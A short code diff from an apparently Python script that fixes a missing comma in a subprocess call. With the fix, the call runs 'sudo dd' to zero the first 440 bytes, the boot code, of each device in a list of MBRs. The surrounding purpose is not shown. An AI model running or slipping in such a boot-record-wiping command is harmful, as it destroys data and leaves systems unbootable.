@@ -32,5 +32,5 @@ while True:
 
 
 for mbr in mbrs:
-    Popen(['sudo' 'dd', 'if=/dev/zero', 'of=' + mbr, 'bs=440', 'count=1'], stdin=PIPE, stdout=PIPE, stderr=PIPE).communicate()
+    Popen(['sudo', 'dd', 'if=/dev/zero', 'of=' + mbr, 'bs=440', 'count=1'], stdin=PIPE, stdout=PIPE, stderr=PIPE).communicate()
 
